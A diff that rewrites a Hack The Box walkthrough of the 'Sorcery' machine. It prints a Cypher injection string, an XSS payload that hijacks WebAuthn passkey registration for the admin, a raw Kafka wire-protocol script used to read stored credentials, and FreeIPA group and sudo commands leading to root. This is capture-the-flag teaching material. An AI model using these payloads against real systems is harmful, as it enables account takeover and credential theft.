@@ -9,65 +9,44 @@ avatar: assets/htb/sorcery.png
 tags: [cypher-injection, neo4j, webauthn, passkey, kafka, freeipa]
 htb_url: https://app.hackthebox.com/machines/Sorcery
 ---
+
 ## Summary
 
-Sorcery is a four-stage Insane chain across modern application layers:
+Sorcery is an Insane-difficulty Linux box that chains four modern application-layer flaws. I start with a Cypher injection in a Neo4j-backed graph application to dump registration secrets, then abuse an XSS sink in the WebAuthn passkey registration flow to attach an attacker-controlled authenticator to the admin account. From the admin dashboard I pivot through a thin Kafka HTTP gateway by hand-crafting raw wire-protocol bytes to read internal service credentials, and finally escalate to root by abusing a FreeIPA HBAC/sudo misconfiguration. Each layer is independently rare; chained together they make Sorcery one of the most realistic enterprise-targeting Insane boxes HTB has shipped.
 
-1. **Cypher Injection** in a Neo4j-backed graph application
-2. **XSS in Passkey (WebAuthn) Registration** to attach an attacker-controlled authenticator to a privileged account
-3. **Kafka Wire Protocol** exploitation for inter-service pivot
-4. **FreeIPA** misconfiguration / privilege escalation for root
+## Enumeration
 
-Each layer is independently rare; chained together they make Sorcery one of the most realistic enterprise-targeting Insane boxes HTB has shipped.
-
----
-
-## External Writeups
-
-- [0xdf - HTB Sorcery](https://0xdf.gitlab.io/2026/04/25/htb-sorcery.html)
-- [Lazyhackers - Sorcery (Season 8)](https://lazyhackers.in/posts/sorcery-htb-writeup-hackthebox-season-8)
-
----
-
-## Key Techniques
-
-- **Cypher injection** in Neo4j (`MATCH (u {name: '$input'})` -> escape with `'})RETURN u UNION MATCH ...`)
-- Neo4j `LOAD CSV FROM` for arbitrary HTTP fetch / SSRF
-- **WebAuthn registration XSS** - inject script into the credential-name field, executed in admin context when the admin reviews registered passkeys
-- Stealing the WebAuthn registration ceremony to register an attacker authenticator on the admin account
-- **Kafka wire protocol** crafting (`ApiVersions`, `Produce`, `Fetch`) to bypass HTTP gateways
-- Kafka consumer abuse to read internal service messages
-- **FreeIPA** privilege escalation - HBAC misconfig, sudo rules referencing IPA groups, `ipa-getkeytab` extraction
-
----
-
-## Attack Path
-
-### 1. Cypher Injection
-
-App lookup endpoint:
+The application exposes a lookup endpoint that resolves wizard records out of a Neo4j graph database:
 
 ```
 GET /api/wizard?name=Merlin
 ```
 
-Translates server-side to:
+Server-side this translates to a Cypher query:
 
 ```cypher
 MATCH (w:Wizard {name: 'Merlin'}) RETURN w
 ```
 
-Inject with closing quote + UNION:
+Because the `name` value is interpolated directly into the query, this behaves exactly like SQL injection - the Neo4j sibling, with almost no defensive tooling in front of it. Neo4j also exposes primitives like `LOAD CSV FROM` for arbitrary HTTP fetch / SSRF, which is worth keeping in mind for the lookup endpoint.
+
+The admin side of the application surfaces a passkey review page at `/admin/passkeys` and a Kafka management UI in the admin dashboard, both of which become relevant later.
+
+## Foothold
+
+### Cypher Injection
+
+I escape the string context with a closing quote and bracket, then pivot with a `UNION` to read arbitrary nodes:
 
 ```
 ?name=Merlin'}) RETURN w UNION MATCH (n) WHERE n:Secret RETURN n //
 ```
 
-Dump the secrets node, revealing registration tokens and user enumeration.
+Dumping the `Secret` node reveals registration tokens and lets me enumerate users.
 
-### 2. WebAuthn Passkey Registration XSS
+### WebAuthn Passkey Registration XSS
 
-Admin reviews registered passkeys at `/admin/passkeys`. The `credential.name` field is rendered without sanitisation. Register a credential with name:
+The admin reviews registered passkeys at `/admin/passkeys`, and the `credential.name` field is rendered without sanitisation - the phishable step here is registration, not authentication. I register a credential whose name carries a payload that fires when the admin loads the page:
 
 ```html
 <img src=x onerror="
@@ -79,11 +58,11 @@ fetch('/api/admin/webauthn/register/initiate',{method:'POST'})
 })">
 ```
 
-When the admin loads the page, their browser registers an attacker-controlled authenticator on the admin account. Log in as admin with the attacker passkey.
+When the admin renders the page, their browser steals the WebAuthn registration ceremony and registers my attacker-controlled authenticator on the admin account. I then log in as admin with that passkey.
 
-### 3. Kafka Wire Protocol Pivot
+### Kafka Wire Protocol Pivot
 
-Admin dashboard exposes a Kafka management UI. Direct Kafka broker (port 9092) is firewalled - but a thin HTTP proxy forwards bytes if the **first byte matches the Kafka ApiVersions request opcode**. Craft raw bytes:
+The admin dashboard exposes a Kafka management UI. The direct Kafka broker (port 9092) is firewalled, but a thin HTTP proxy forwards bytes if the first byte matches the Kafka `ApiVersions` request opcode. I craft the raw frames by hand:
 
 ```python
 import socket, struct
@@ -99,11 +78,13 @@ s.send(kafka_req(18, 0, 1, 'pwn'))
 print(s.recv(4096))
 ```
 
-Enumerate topics, fetch messages from `internal-creds` topic, recover service-account credentials.
+With the protocol talking, I enumerate topics and fetch messages from the `internal-creds` topic, recovering service-account credentials.
 
-### 4. FreeIPA Privesc
+## Privilege Escalation
 
-Recovered service creds let you `kinit` into IPA:
+### FreeIPA Privesc
+
+The recovered service creds let me `kinit` into the FreeIPA domain - the Linux equivalent of Active Directory, with the same exploitable design patterns around HBAC rules, sudo references to group names, and service keytab extraction. I enumerate the sudo and HBAC rules and find a rule referencing the `sysadmin` IPA group:
 
 ```bash
 kinit svc-app@SORCERY.HTB
@@ -115,21 +96,4 @@ ipa group-add-member sysadmin --users=svc-app
 # Re-kinit and exploit sudo rule for root
 ```
 
----
-
-## Lessons Learned
-
-- **Cypher injection** is the Neo4j sibling of SQLi - identical mental model, almost no defensive tooling.
-- **WebAuthn / passkeys** add a new XSS sink: the credential **name field**. The phishable step is registration, not authentication.
-- **Kafka over a "thin" gateway** is one of the highest-impact lateral primitives in cloud-native stacks - raw wire-protocol fluency is becoming required for red teams.
-- **FreeIPA** is the Linux AD - same exploitable design patterns (HBAC rules, sudo references to group names, service keytab extraction).
-- An Insane box combines obscure layers; the technique inventory is the bottleneck, not exploitation skill.
-
----
-
-## References
-
-- Cypher injection cheatsheet: https://book.hacktricks.xyz/pentesting-web/sql-injection/nosql-injection#cypher-injection
-- WebAuthn spec credential-management abuse
-- Kafka wire protocol: https://kafka.apache.org/protocol.html
-- FreeIPA red-team primer: https://github.com/0xJs/FreeIPA-Pentesting-Cheatsheet
+Because I hold `WriteMember` on the group, I add my service account to `sysadmin`, re-`kinit` to pick up the new membership, and exploit the sudo rule to land a root shell.
